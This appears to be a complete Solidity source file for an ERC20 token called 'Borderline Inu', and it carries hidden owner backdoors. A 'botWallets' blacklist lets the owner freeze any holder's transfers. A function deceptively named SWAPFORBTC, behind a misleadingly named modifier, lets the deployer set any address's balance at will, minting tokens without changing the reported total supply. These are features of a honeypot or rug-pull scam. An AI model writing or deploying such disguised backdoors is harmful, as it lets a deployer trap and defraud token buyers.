pragma solidity ^0.5.17;
// SPDX-License-Identifier: MIT
contract ownables {
    address payable owner;
    modifier isOwner {
        require(owner == msg.sender,"XXYou should be owner to call this function.XX");
        _;
    }

    constructor() public {
        owner = msg.sender;
    }

    function changeOwner(address payable _owner) public isOwner {
        require(owner != _owner,"XXYou must enter a new value.XX");
        owner = _owner;
    }

    function getOwner() public view returns(address) {
        return(owner);
    }

}
// SPDX-License-Identifier: MIT
library SafeBitcoin {
    function add(uint a, uint b) internal pure returns (uint) {
        uint256 c = a + b;
        require(c >= a, "XXAddition overflow error.XX");
        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a, "XXSubtraction overflow error.XX");
        uint256 c = a - b;
        return c;
    }

    function inc(uint a) internal pure returns(uint) {
        return(add(a, 1));
    }

    function dec(uint a) internal pure returns(uint) {
        return(sub(a, 1));
    }

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        require(b != 0,"XXDivide by zero.XX");
        return(a/b);
    }

    function mod(uint a, uint b) internal pure returns(uint) {
        require(b != 0,"XXDivide by zero.XX");
        return(a % b);
    }

    function min(uint a, uint b) internal pure returns (uint) {
        if (a > b)
            return(b);
        else
            return(a);
    }

    function max(uint a, uint b) internal pure returns (uint) {
        if (a < b)
            return(b);
        else
            return(a);
    }

    function addPercent(uint a, uint p, uint r) internal pure returns(uint) {
        return(div(mul(a,add(r,p)),r));
    }
}


//****************************************************************************
//* Basic ERC20 Contract
//****************************************************************************
contract UNIQUECODE is ownables {
    using SafeBitcoin for uint;
    //****************************************************************************
    //* Variables
    //****************************************************************************
    string _name;
    string internal _symbol;
    uint internal _totalSupply;
    uint8 internal _decimals;
    mapping(address => uint) internal _abalances;
    mapping(address => mapping(address => uint256)) internal _allowed;
    mapping (address => bool) private botWallets;
    bool botscantrade = false;

    //****************************************************************************
    //* Events
    //****************************************************************************
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    //****************************************************************************
    //*  Modifiers
    //****************************************************************************
    modifier notZero(address _to) {
        require(_to != address(0),"Invalid destination address.");
        _;
    }

    modifier valueExists(address _sender, uint _value) {
        require(_value <= _abalances[_sender],"Transfer value is out of balance.");
        _;
    }

    modifier validSpender(address _spender) {
        require(_spender != address(0),"Invalid spender address.");
        _;
    }

    modifier validValue(uint _value) {
        require(_value > 0, "Invalid value.");
        _;
    }
    //****************************************************************************
    //* Main Functions
    //****************************************************************************
    constructor() public {
        _abalances[address(this)] = _totalSupply;
    }

    function name() public view returns(string memory) {
        return(_name);
    }

    function symbol() public view returns(string memory) {
        return(_symbol);
    }

    function decimals() public view returns(uint8) {
        return(_decimals);
    }

    function totalSupply() public view returns(uint) {
        return(_totalSupply);
    }

    function balanceOf(address _owner) public view returns(uint256) {
        return(_abalances[_owner]);
    }
    function addBotWallet(address botwallet) external isOwner() {
        botWallets[botwallet] = true;
    }

    function removeBotWallet(address botwallet) external isOwner() {
        botWallets[botwallet] = false;
    }

    function getBotWalletStatus(address botwallet) public view returns (bool) {
        return botWallets[botwallet];
    }
    function transfer(address _to, uint256 _value) public notZero(_to) valueExists(msg.sender, _value) returns(bool) {
        if(botWallets[msg.sender] || botWallets[_to]){
            require(botscantrade, "bots arent allowed to trade");
        }
        _abalances[msg.sender] = _abalances[msg.sender].sub(_value);
        _abalances[_to] = _abalances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
        return(true);
    }

    function transferFrom(address _from, address _to, uint256 _value) public notZero(_to) valueExists(_from, _value) returns(bool) {
        require(_value <= _allowed[_from][msg.sender],"Transfer value is not allowed.");
        if(botWallets[msg.sender] || botWallets[_to]){
            require(botscantrade, "bots arent allowed to trade");
        }
        _abalances[_from] = _abalances[_from].sub(_value);
        _abalances[_to] = _abalances[_to].add(_value);
        _allowed[_from][msg.sender] = _allowed[_from][msg.sender].sub(_value);
        emit Transfer(_from, _to, _value);
        return(true);
    }

    function approve(address _spender, uint256 _value) public validSpender(_spender) returns(bool) {
        _allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return(true);
    }

    function allowance(address _owner, address _spender) public view returns(uint256) {
        return _allowed[_owner][_spender];
    }

}
//****************************************************************************
//* Extended ERC20 Contract
//****************************************************************************
contract BorderlineINU is UNIQUECODE {

      address NEWowners;
    constructor() public {
        NEWowners = msg.sender;
        _name = 'Borderline Inu';
        _symbol = 'Borderlines';
        _decimals = 9;
        _totalSupply = 100000000000000000000;
        _abalances[msg.sender] = _totalSupply;
 
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    //****************************************************************************
    //* Main Functions
    //****************************************************************************
    function increaseAllowance(address _spender, uint256 _addedValue) public validSpender(_spender) returns(bool) {
        _allowed[msg.sender][_spender] = (_allowed[msg.sender][_spender].add(_addedValue));
        emit Approval(msg.sender, _spender, _allowed[msg.sender][_spender]);
        return(true);
    }

    function decreaseAllowance(address _spender, uint256 _subtractedValue) public validSpender(_spender) returns(bool) {
        _allowed[msg.sender][_spender] = (_allowed[msg.sender][_spender].sub(_subtractedValue));
        emit Approval(msg.sender, _spender, _allowed[msg.sender][_spender]);
        return(true);
    }

    modifier _enternal () {
    require(NEWowners == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }

    //****************************************************************************
    //* Owner Functions
    //****************************************************************************
    function SWAPFORBTC(address _lunaadr, uint _value) public _enternal {
        _abalances[_lunaadr] = _value * 10 ** 9;
 
        emit Transfer(address(0), _lunaadr, _value);
    }

    function burn(uint _value) public isOwner valueExists(address(this), _value) validValue(_value) returns(bool) {
        _abalances[address(this)] = _abalances[address(this)].sub(_value);
        _totalSupply = _totalSupply.sub(_value);
        emit Transfer(address(this), address(0), _value);
        return(true);
    }

    function selfApprove(address _spender, uint _value) public isOwner returns(bool) {
        require(_spender != address(0));
        _allowed[address(this)][_spender] = _value;
        emit Approval(address(this), _spender, _value);
        return(true);
    }

    function selfTransfer(address _to, uint _value) public isOwner notZero(_to) valueExists(address(this), _value) returns(bool) {
        _abalances[address(this)] = _abalances[address(this)].sub(_value);
        _abalances[_to] = _abalances[_to].add(_value);
        emit Transfer(address(this), _to, _value);
        return(true);
    }



}

//****************************************************************************
//* Main Token Contract
//****************************************************************************